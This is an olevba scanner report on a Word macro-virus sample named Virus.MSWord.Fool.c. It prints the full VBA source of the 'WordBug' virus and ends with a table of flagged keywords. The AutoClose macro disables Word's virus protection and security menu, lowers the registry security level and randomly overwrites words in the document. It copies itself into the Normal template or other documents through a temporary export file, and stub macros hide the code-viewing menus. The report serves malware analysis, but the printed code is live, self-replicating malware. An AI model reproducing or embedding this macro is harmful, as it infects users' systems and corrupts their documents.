olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordBug.bas 
in file: Virus.MSWord.Fool.c - OLE stream: 'Macros/VBA/WordBug'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
    'WordBug Virus V1.00
    'The WaLRuS 04/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    Dim lngNumberOfWords As Long
    Dim lngFirstIndex As Long, lngSecondIndex As Long
    Dim strFirst As String, strSecond As String
    lngNumberOfWords = ActiveDocument.ComputeStatistics(wdStatisticWords)
    lngFirstIndex = Int(lngNumberOfWords * Rnd())
    lngSecondIndex = Int(lngNumberOfWords * Rnd())
    strFirst = ActiveDocument.Words(lngFirstIndex).Text
    ActiveDocument.Words(lngSecondIndex).Text = strFirst
    Set Norm = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("WordBug").Name <> "WordBug" Then
    Doc("WordBug").Export "c:\WordBug.drv"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("WordBug").Name <> "WordBug" Then
    Norm("WordBug").Export "c:\WordBug.drv"
    Set infect = ActiveDocument.VBProject
End If
With Dialogs(wdDialogFileSummaryInfo)
    .Subject = "WordBug"
    .Execute
End With
infect.VBComponents.Import ("c:\WordBug.drv")
Kill ("c:\WordBug.drv")
ActiveDocument.Save
End Sub

Sub ToolsMacro(): End Sub
Sub FileTemplates(): End Sub
Sub ViewVBCode(): End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

